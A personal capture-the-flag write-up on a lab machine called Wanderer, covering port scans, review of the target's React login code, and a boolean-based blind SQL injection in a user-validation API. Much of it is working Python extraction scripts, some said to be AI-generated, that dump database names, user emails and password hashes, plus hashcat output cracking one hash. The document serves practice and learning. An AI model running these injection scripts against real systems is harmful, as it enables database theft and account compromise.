A quick check at the TCP ports shows that this is a webserver:

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 cc:cc:02:17:38:c2:ff:f3:48:f4:71:be:96:43:a8:43 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKibXZ92EaJqP1dNrkpAfbZhrfnDK1jvpRudsIyRE69ZX/+L5waB58Kmc7rGOigaWvNDWhyrkLaaCeKDXNQCyjU=
|   256 26:e2:85:68:8e:b7:59:e7:77:f9:bb:38:d5:e7:6c:89 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGxd2zaMDbyDUCRILbtW4CT2bdvNwnbkxdWfxYh91EEd
80/tcp open  http    syn-ack ttl 62 nginx 1.18.0 (Ubuntu)
|_http-title: VAULT ACCESS (WARNING: AUTHORIZED ACCESS ONLY)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router|firewall
Running (JUST GUESSING): Linux 4.X|5.X|6.X (94%), MikroTik RouterOS 7.X (88%), IPFire 2.X (86%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:ipfire:ipfire:2.27 cpe:/o:linux:linux_kernel:6.1
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.19 - 5.15 (94%), Linux 4.15 - 5.19 (88%), Linux 5.0 - 5.14 (88%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (88%), Linux 4.15 (88%), IPFire 2.27 (Linux 5.15 - 6.1) (86%), Linux 5.4 (86%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=4/7%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=69D4D7D1%P=x86_64-pc-linux-gnu)
SEQ(TS=A)
SEQ(II=RI)
OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=40%CD=S)

Uptime guess: 43.285 days (since Mon Feb 23 04:18:51 2026)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   23.46 ms 10.10.14.1
2   23.51 ms 10.10.110.20

```

But it supports a DNS as well, which might be good to know when enumerating for DNS records:

```bash
─$ nmap -F -sU 10.10.110.20              
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 12:48 +0200
Nmap scan report for 10.10.110.20
Host is up (0.023s latency).
Not shown: 98 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp

Nmap done: 1 IP address (1 host up) scanned in 2.70 seconds

```

# Http

This seems to me the real machine where I am supposed to get a foothold jusding by this login page:

![58cc0c8396857ddc82c0292da5b8d5f7.png](../../../_resources/58cc0c8396857ddc82c0292da5b8d5f7.png)

Now I could surely check for SQLi but I can immediately see from the client-side JS code traces of a LFI based on the cookie field?

```js
import React from "react";
import { FileUploader } from "react-drag-drop-files";
import './App.css';

export default class App extends React.Component {
  constructor(props) {
    super(props);    

    this.state = {
      hostUrl: "http://10.10.110.20", 
      Email: '', 
      Password: '', 
      Message: '', 
      FileName: '',
      files: JSON.parse(sessionStorage.getItem("files")) || [], // retrieve files from sessionStorage
    };
    this.handleFileUpload = this.handleFileUpload.bind(this); // bind handleFileUpload to component instance

  }

  handleChange(e) {
    const tempState = {};
    tempState[e.target.id] = e.target.value;
    this.setState(tempState);
  }

  handleFileUpload(file) {
    //const file = files[0];
    if (!file) {
      console.error("No file selected");
      return;
    }
  
    const formData = new FormData();
    formData.append("file", file);
  
    const reader = new FileReader();
    reader.onload = (event) => {
      const fileContents = event.target.result;
      formData.append("fileContents", fileContents);
  
      fetch(this.state.hostUrl + "/api/v1/file/upload", {
        method: "POST",
        body: formData,
        headers: {
          Authorization: `Bearer ${sessionStorage.getItem("access_token")}`,
        },
      })
        .then((response) => {
          if (!response.ok) {
            throw new Error("Network response was not ok");
          }
          return response.json();
        })
        .then((data) => {
          this.setState({ FileName: data.filename });
        })
        .catch((error) => {
          console.error("Error uploading file:", error);
        });
    };
    reader.readAsText(file);
    alert("File Sent to Admins!")
  }
  
  handleFileUploadError(error) {
    console.error("Error uploading file:", error);
  }
  
  handleFileUploadProgress(progress) {
    console.log("File upload progress:", progress);

  }

  downloadFile(file) {
    fetch(this.state.hostUrl + "/api/v1/file/" + file.uuid, {
      headers: { Authorization: `Bearer ${sessionStorage.getItem("access_token")}` },
    })
      .then((response) => response.blob())
      .then((blob) => {
        const url = window.URL.createObjectURL(new Blob([blob]));
        const link = document.createElement("a");
        link.href = url;
        link.setAttribute("download", file.filename);
        document.body.appendChild(link);
        link.click();
        link.parentNode.removeChild(link);
      })
      .catch((error) => console.error(error));
  }

  async signUp() {
    if (this.state.Email == '' | this.state.Password == '') {
      this.setState({Message: "Missing username or password field."});
      return;
    }
    const data = {};
    data["email"] = this.state.Email;
    data["password"] = this.state.Password;
    const response = await fetch(this.state.hostUrl+"/api/v1/user/register", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    }).then((response) => {
      if (response.status !== 201) {
        response.json().then((data) => {
          this.setState({Message: data.detail});
        })} else {
          this.setState({Message: "User successfully created!  You may login now."});
      };
    });
    //return response.json();
  }

  async fetchFiles() {
    
      const response = fetch(this.state.hostUrl + "/api/v1/file/", {
        method: "GET",
        headers: {
          Authorization: `Bearer ${sessionStorage.getItem("access_token")}`,
        },
      })
        .then((response) => {
          if (!response.ok) {
            throw new Error("Network response was not ok");
          }
          response.json().then((data) => {
            sessionStorage.setItem("files", JSON.stringify(data.owned_by_you + data.shared));
            this.forceUpdate(); 
          });
        });
        this.forceUpdate();
  }

  async checkAdmin() {
    if (this.state.Email !== '') {
      const response = await fetch(this.state.hostUrl+"/api/v1/admin/", {      
        method: "GET",
        headers: {
          "Authorization": `Bearer ${sessionStorage.getItem("access_token")}`
        },
      }).then((response) => {
        response.json().then((data) => {
          sessionStorage.setItem("isAdmin", data.results);
          this.setState({isAdmin: data.results});
          if (data.results == true) {
            const response = fetch(this.state.hostUrl + "/api/v1/file/", {
              method: "GET",
              headers: {
                Authorization: `Bearer ${sessionStorage.getItem("access_token")}`,
              },
            })
              .then((response) => {
                if (!response.ok) {
                  throw new Error("Network response was not ok");
                }
                response.json().then((data) => {
                  console.log(data.owned_by_you);
                  sessionStorage.setItem("files", JSON.stringify(data.owned_by_you));                  
                  this.setState({files: JSON.parse(sessionStorage.getItem("files"))});
                });
                
                //this.forceUpdate();
              });
          }
        });
      });
    }
    //return response.json();
  }

  async getFileAsAdmin() {
    const response = await fetch(this.state.hostUrl+`/api/v1/admin/file/${this.state.FileName}`, {
      method: "GET",
      headers: {
        "Authorization": `Bearer ${sessionStorage.getItem("access_token")}`
      },
    }).then((response) => {
      if (response.ok) {
        response.json().then((data) => {
          if ("file" in data) {
            this.setState({ Message: data.file });
          } else {
            this.setState({ Message: data.msg });
          }
        })
      };
      throw new Error('Something went wrong');
    }).then((responseJson) => {
      // Do something with the response
    })
    .catch((error) => {
      //console.log(error)
      this.setState({Message: "Something went wrong."});
    });
    //return response.json();
  }

  async login() {
    const data = {};
    const response = await fetch(this.state.hostUrl+"/api/v1/user/login", {
      method: "POST",
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `username=${this.state.Email}&password=${this.state.Password}`,
    }).then((response) => {
      if (response.ok) {
        response.json().then((data) => {
          if (response.status !== 200) {
            this.setState({Message: data.detail[0].msg});
          } else {
            sessionStorage.setItem("access_token", data.access_token);
            sessionStorage.setItem("user", this.state.Email);
            this.setState({Message: ''});
            this.checkAdmin();
            this.forceUpdate();
          }
        });
      };
      throw new Error('Something went wrong');
    }).then((responseJson) => {
      this.forceUpdate();
    })
    .catch((error) => {
      //console.log(error)
      this.setState({Message: "Something went wrong."});
    });
    //return response.json();
  }

  async checkUser() {
    if (this.state.Email !== '') {
      const response = await fetch(this.state.hostUrl+`/api/v1/user/validate/${this.state.Email}`, {
        method: "GET",
      }).then((response) => {
        response.json().then((data) => {
          data = JSON.stringify(data);
          if (data == "true") {
            data = "User exists"
          } else {
            data = "User does not exist"
          }
          this.setState({ Message: data });
        });
      });
      //return response.json();
    } else {
      this.setState({Message: ""})
    }
  }

  loginEnter(e) {
    if (e.keyCode == 13) {
      this.login();
    }
  }

  logout() {
    sessionStorage.removeItem("access_token");
    sessionStorage.removeItem("user");
    sessionStorage.removeItem("isAdmin")
    this.forceUpdate();
  }

  render () {
    if (sessionStorage.getItem("access_token") == undefined) {
      return (
        <div className="App">
          <section> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> 
          <div className="signin">
            <div className="content"> 
            <h2>Sign In</h2>
            <div className="response"> { (this.state.Message) } </div>
            <div className="form">
              <div className="inputBox"> 
              <input onBlur={function(){this.checkUser()}.bind(this)} onChange={function(e){this.handleChange(e)}.bind(this)} value={this.state.Email} id="Email" name="Email" placeholder="Email" type="text" required="required" />
              </div> 
              <div className="inputBox"> 
              <input onKeyDown={function(e){this.loginEnter(e)}.bind(this)} onChange={function(e){this.handleChange(e)}.bind(this)} id="Password" name="Password" placeholder="Password" type="Password" required="required" />
              </div> 
              <div className="links"><button onClick={function(){this.signUp()}.bind(this)}>Signup</button> 
              </div> 
              <div className="inputBox"> 
              <input type="submit" value="Login" onClick={function(){this.login()}.bind(this)}/>
              </div> 
            </div> 
            </div> 
          </div>
          </section>
        </div>
      );
    } else {
      return (
        <div className="App">
          <section> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span>
          <div className="signin">
            <div className="content">
              <div>
              {sessionStorage.getItem("isAdmin") === "false" ? (
            <FileUploader
              onDrop={this.handleFileUpload} // pass handleFileUpload as callback to onDrop event handler
              onError={this.handleFileUploadError.bind(this)}
              onProgress={this.handleFileUploadProgress.bind(this)}
              accept=".zip"
            >
              <div className="file-uploader">
                <div className="file-uploader__icon">
                  <i className="fa fa-upload"></i>
                </div>
                <div className="file-uploader__text">
                  Drag and drop a ZIP file here to send to the Admins
                </div>
              </div>
              </FileUploader>
            ) : null}
              </div>              

              {/*<div className="response">Logged in as {sessionStorage.getItem("user")} <br /> Admin: {sessionStorage.getItem("isAdmin") === undefined ? "":sessionStorin")}</div>*/}
              {
                  sessionStorage.getItem("isAdmin") === "true" ?
                  <div className="response">Uploaded Files</div>:
                  ""
              }
              <div className="form">
                {
                  sessionStorage.getItem("isAdmin") === "true" ? 
                  
                  <div>
                  <div className="Uploaded Files"> 
                  <ul>
                  {
                    this.state.files.map((file) => (
                    <li key={file.id}>
                      <a href="#" onClick={() => this.downloadFile(file)}>{file.filename}</a>
                    </li>
                  ))}
                  </ul>
                  
                  </div>
                  </div>:
                  ""
                }
                <div className="inputBox"> 
                <input type="submit" value="Logout" onClick={function(){this.logout()}.bind(this)}/>
                </div>  
              </div>
            </div>
          </div>
          </section>
        </div>
      )
    }
  }
}

```

Now here I registered a new user and I am trying to change manually the admin flat to true:  
![54dc117a4163a0f45e2c8b6ff368f5e9.png](../../../_resources/54dc117a4163a0f45e2c8b6ff368f5e9.png)

But it it seems doing some sort of check so the token looks like this one:

![fc03fb453cd10f0e72bb43be66b07b91.png](../../../_resources/fc03fb453cd10f0e72bb43be66b07b91.png)

Acutally I see that isAdmin actually shows you if you can upload or see the files?  
![0c9b233bc17b30d63fb557ef3f5f56ae.png](../../../_resources/0c9b233bc17b30d63fb557ef3f5f56ae.png)

# The second day

Now I took again the page back and I immediately spotted a SQLi over the email checkup API endpoint, basically requesting an invalid email but comparing with a TRUE equation it passes the validation:

![362dbe0af8c8f07cbe0601757d69ffe3.png](../../../_resources/362dbe0af8c8f07cbe0601757d69ffe3.png)

Consequently shipping a untrue equation results in a false:

![4ae2b6234be85effa62f9d87fe43be22.png](../../../_resources/4ae2b6234be85effa62f9d87fe43be22.png)

This mean I should be able to ex-filtrate data by using a Boolean based SQL injection. Now I need to calculate the number of columns in the current table first and seems like there is 8  
![cae7505d9001b7576dd503071b41cff5.png](../../../_resources/cae7505d9001b7576dd503071b41cff5.png)

Now even injecting a select in the query it works and the sleep is invoked:  
![55208fbfcdc4942598df516bb01dc92f.png](../../../_resources/55208fbfcdc4942598df516bb01dc92f.png)

Now I also checked that file name via session storage token but it seems using a UUID name instead of normal files which might mean that low-privileged user do not are bothered by LFIs:

```bash
downloadFile(file) {
    fetch(this.state.hostUrl + "/api/v1/file/" + file.uuid, {
      headers: { Authorization: `Bearer ${sessionStorage.getItem("access_token")}` },
    })
      .then((response) => response.blob())
      .then((blob) => {
        const url = window.URL.createObjectURL(new Blob([blob]));
        const link = document.createElement("a");
        link.href = url;
        link.setAttribute("download", file.filename);
        document.body.appendChild(link);
        link.click();
        link.parentNode.removeChild(link);
      })
      .catch((error) => console.error(error));
  }
```

And manual tampering the JWT token invalidates the token itself  
![45ba1541d297d721e395f344e058e9c8.png](../../../_resources/45ba1541d297d721e395f344e058e9c8.png)

Now here I lost several time to discover with Gemini that apparently the equal in the select was borking my request and instead using comparison symbols like **\> <** that did the trick to enumerate the DB name.

![16f99d4610b81d731964b2fea91e945d.png](../../../_resources/16f99d4610b81d731964b2fea91e945d.png)

And this returns True untill the correct is False:

![0fb81adc631d10ba025104e584012e0e.png](../../../_resources/0fb81adc631d10ba025104e584012e0e.png)

```bash
└─$ python3 merda.py
[*] Extracting via alphabetical comparison...
[+] Database: FTSzzzzzzzzzzzzzzzzzzzzzzzzzzzz^CTraceback (most recent call last):

```

I asked AI to generate a script that finds the Table name:

```bash
import requests
import sys

# Configuration
URL = "http://10.10.110.20/api/v1/user/validate/"
EMAIL = "yovecio@wanderer.htb"
# MySQL is usually case-insensitive, but we keep the full set
CHARS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"

# The subquery to get the first table name
SUBQUERY = "(SELECT MIN(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())"

def extract():
    # 1. Get Length
    length = 0
    print("[*] Finding table name length...")
    for i in range(1, 31):
        payload = f"{EMAIL}' AND (LENGTH({SUBQUERY})={i})-- -"
        r = requests.get(URL + payload)
        if "true" in r.text.lower():
            length = i
            print(f"[+] Length found: {length}")
            break
    
    if not length:
        print("[!] Could not find length. Check if (1=1) still works.")
        return

    # 2. Get Name
    extracted = ""
    print("[*] Extracting name...")
    for _ in range(length):
        for char in CHARS:
            test_string = extracted + char
            # The 'Squeeze' logic: if name is 'users', then 'users' < 'usert' is True.
            payload = f"{EMAIL}' AND ({SUBQUERY}<'{test_string}')-- -"
            r = requests.get(URL + payload)
            
            if "true" in r.text.lower():
                # We found the boundary, so the char is the one BEFORE this one
                match = CHARS[CHARS.index(char) - 1]
                extracted += match
                sys.stdout.write(f"\r[+] Progress: {extracted}")
                sys.stdout.flush()
                break
    
    print(f"\n[!] Final Table Name: {extracted}")

if __name__ == "__main__":
    extract()

```

And this for the users table:

```bash
$ python3 merda.py 
[*] Searching for tables starting with 'u' in FTS...
[+] Found a table name with length: 4
[*] Extracting name...
[+] Progress: USER
[!] Final Table Name: USER

```

And this to export the first email from the db:

```bash
import requests
import sys

URL = "http://10.10.110.20/api/v1/user/validate/"
EMAIL = "yovecio@wanderer.htb"

# Targeted query settings
COLUMN = "email"
TABLE = "`user`"
# Use a subquery to get the first email alphabetically
TARGET_STR = f"(SELECT MIN({COLUMN}) FROM {TABLE})"

def extract():
    # 1. Get Length (Confirmed as 21, but let's be sure)
    length = 21
    print(f"[*] Target: {COLUMN} | Expected Length: {length}")
    
    extracted = ""
    print("[*] Extracting via ASCII values...")
    
    for i in range(1, length + 1):
        low = 32  # Space
        high = 126 # ~
        
        while low <= high:
            mid = (low + high) // 2
            # MySQL 'No-Comma' Substring: MID(string FROM pos FOR 1)
            # Logic: Is the ASCII value of the character at position i > mid?
            payload = f"{EMAIL}' AND (ORD(MID({TARGET_STR} FROM {i} FOR 1)) > {mid})-- -"
            
            try:
                r = requests.get(URL + payload)
                if "true" in r.text.lower():
                    low = mid + 1
                else:
                    high = mid - 1
            except Exception as e:
                print(f"\n[!] Error: {e}")
                break
        
        char = chr(low)
        extracted += char
        sys.stdout.write(f"\r[+] Progress: {extracted}")
        sys.stdout.flush()

    print(f"\n[!] Final {COLUMN}: {extracted}")

if __name__ == "__main__":
    extract()
```

Result:

```bash
└─$ python3 merda.py
[*] Target: email | Expected Length: 21
[*] Extracting via ASCII values...
[+] Progress: ftsadmin@wanderer.htb
[!] Final email: ftsadmin@wanderer.htb

```

And to find the column name of the password I used this script:

```bash
import requests
import sys

URL = "http://10.10.110.20/api/v1/user/validate/"
EMAIL = "yovecio@wanderer.htb"

# Skip the columns we already found to find the next one
# We use NOT IN ('email', 'guid') but without commas:
SUBQUERY = "(SELECT MIN(column_name) FROM information_schema.columns WHERE table_name='user' AND column_name != 'email' AND column_name != 'guid')"

def find_next_column():
    length = 0
    print("[*] Searching for the 3rd column...")
    for i in range(1, 31):
        payload = f"{EMAIL}' AND (LENGTH({SUBQUERY})={i})-- -"
        if "true" in requests.get(URL + payload).text.lower():
            length = i
            break
    
    if length == 0:
        print("[!] No more columns found.")
        return

    extracted = ""
    for i in range(1, length + 1):
        low = 32
        high = 126
        while low <= high:
            mid = (low + high) // 2
            payload = f"{EMAIL}' AND (ORD(MID({SUBQUERY} FROM {i} FOR 1)) > {mid})-- -"
            if "true" in requests.get(URL + payload).text.lower():
                low = mid + 1
            else:
                high = mid - 1
        extracted += chr(low)
        sys.stdout.write(f"\r[+] Found Column: {extracted}")
        sys.stdout.flush()
    print(f"\n[!] Success: {extracted}")

if __name__ == "__main__":
    find_next_column()
```

Lasltly this is the script that exports the password hash of the user ftsadmin from the user table at the FTS database:

```bash
import requests
import sys

URL = "http://10.10.110.20/api/v1/user/validate/"
EMAIL = "yovecio@wanderer.htb"

# Targeted query settings
COLUMN = "hashed_password"
TABLE = "`user`"
# Target the ftsadmin user specifically
TARGET_STR = f"(SELECT {COLUMN} FROM {TABLE} WHERE email='ftsadmin@wanderer.htb')"

def extract():
    # 1. Get Length of the hash
    length = 0
    print(f"[*] Finding hash length for ftsadmin...")
    for i in range(1, 100):
        payload = f"{EMAIL}' AND (LENGTH({TARGET_STR})={i})-- -"
        if "true" in requests.get(URL + payload).text.lower():
            length = i
            print(f"[+] Hash length found: {length}")
            break
    
    if length == 0:
        print("[!] Could not find any data in 'hashed_password'.")
        return

    # 2. Extract via Binary Search (ASCII)
    extracted = ""
    print("[*] Extracting hash...")
    for i in range(1, length + 1):
        low = 32
        high = 126
        while low <= high:
            mid = (low + high) // 2
            # No-comma substring: MID(string FROM pos FOR 1)
            payload = f"{EMAIL}' AND (ORD(MID({TARGET_STR} FROM {i} FOR 1)) > {mid})-- -"
            
            r = requests.get(URL + payload)
            if "true" in r.text.lower():
                low = mid + 1
            else:
                high = mid - 1
        
        char = chr(low)
        extracted += char
        sys.stdout.write(f"\r[+] Progress: {extracted}")
        sys.stdout.flush()

    print(f"\n[!] Final Hash: {extracted}")

if __name__ == "__main__":
    extract()
```

And this is the password of the user:

```bash
─$ python3 merda.py                                    
[*] Finding hash length for ftsadmin...
[+] Hash length found: 34
[*] Extracting hash...
[+] Progress: $1$dRL7Yx/F$w04OvDli6Mie178NJ3zmh0
[!] Final Hash: $1$dRL7Yx/F$w04OvDli6Mie178NJ3zmh0
                                                       

$1$dRL7Yx/F$w04OvDli6Mie178NJ3zmh0:fallout81              
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: $1$dRL7Yx/F$w04OvDli6Mie178NJ3zmh0
Time.Started.....: Wed Apr  8 12:53:48 2026 (1 sec)
Time.Estimated...: Wed Apr  8 12:53:49 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1428.4 kH/s (11.19ms) @ Accel:4 Loops:1000 Thr:768 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 958464/14344385 (6.68%)
Rejected.........: 0/958464 (0.00%)
Restore.Point....: 884736/14344385 (6.17%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: lennylover -> enamor
Hardware.Mon.#01.: Temp: 64c Util: 24% Core:2610MHz Mem:8000MHz Bus:8

Started: Wed Apr  8 12:53:40 2026
Stopped: Wed Apr  8 12:53:50 2026
                                                                                                                                                               
┌──(millycash㉿kali-bello)-[~/Downloads/Wanderer]

```

Now at login I see 2 files one is a flag and the other is a APK file:

![ee9e8d3785d1e313d47a71aa6f3784a3.png](../../../_resources/ee9e8d3785d1e313d47a71aa6f3784a3.png)

So this is a flag:

```bash
└─$ cat ../flag.txt 
HTB{cf1b6ae88b15b9da997720ddb9097de4}     
```

This is the final version of the Python opracle script that automates the exfiltration bypassing the quotes blacklisting:

```bash
import requests
import sys

# --- CONFIGURATION ---
URL = "http://10.10.110.20/api/v1/user/validate/"
EMAIL_VAL = "yovecio@wanderer.htb"

def rex(query):
    """Core extraction engine using Binary Search + No-Comma MID()"""
    extracted = ""
    # 1. Get length
    length = 0
    for i in range(1, 100):
        payload = f"{EMAIL_VAL}' AND (LENGTH({query})={i})-- -"
        if "true" in requests.get(URL + payload).text.lower():
            length = i
            break
    if length == 0: return None

    # 2. Extract characters
    for i in range(1, length + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = f"{EMAIL_VAL}' AND (ORD(MID({query} FROM {i} FOR 1)) > {mid})-- -"
            if "true" in requests.get(URL + payload).text.lower():
                low = mid + 1
            else:
                high = mid - 1
        extracted += chr(low)
        sys.stdout.write(f"\r    [+] Progress: {extracted}")
        sys.stdout.flush()
    print() 
    return extracted

def enumerate_users():
    print("[*] Starting Full User Enumeration...")
    found_emails = []
    last_email = ""

    while True:
        # Find the next email alphabetically that is greater than the last one found
        if not last_email:
            query = "(SELECT MIN(email) FROM `user` )"
        else:
            query = f"(SELECT MIN(email) FROM `user` WHERE email > '{last_email}')"
        
        print(f"[*] Extracting next user...")
        email = rex(query)
        
        if not email:
            print("[!] No more users found.")
            break
            
        # Now get the password for this specific email
        print(f"    [*] Fetching hash for {email}...")
        pwd_query = f"(SELECT hashed_password FROM `user` WHERE email='{email}')"
        password = rex(pwd_query)
        
        found_emails.append((email, password))
        last_email = email
        print("-" * 40)

    print("\n[!] ENUMERATION COMPLETE:")
    print(f"{'EMAIL':<30} | {'HASH'}")
    print("-" * 60)
    for u, p in found_emails:
        print(f"{u:<30} | {p}")

if __name__ == "__main__":
    enumerate_users()
```

This is how it looks like when executed.

```bash
─$ python3 oracle.py 
[*] Starting Full User Enumeration...
[*] Extracting next user...
    [+] Progress: ftsadmin@wanderer.htb
    [*] Fetching hash for ftsadmin@wanderer.htb...
    [+] Progress: $1$dRL7Yx/F$w04OvDli6Mie178NJ3zmh0
----------------------------------------
[*] Extracting next user...
    [+] Progress: katja@wanderer.htb
    [*] Fetching hash for katja@wanderer.htb...
    [+] Progress: $2y$12$FfPJ91/XisCLmjgKnJJn8.ZEIE9Ivv13.f/qCza4dIgXJLh2zZZM2
----------------------------------------
[*] Extracting next user...
    [+] Progress: yovecio@wanderer.htb
    [*] Fetching hash for yovecio@wanderer.htb...
    [+] Progress: $2b$12$e5GBHT6XWUNKfvLYH1viE.16y/2vUpvUOljMG/wh/qQLFkpHF9c8i
----------------------------------------
[*] Extracting next user...
[!] No more users found.

[!] ENUMERATION COMPLETE:
EMAIL                          | HASH
------------------------------------------------------------
ftsadmin@wanderer.htb          | $1$dRL7Yx/F$w04OvDli6Mie178NJ3zmh0
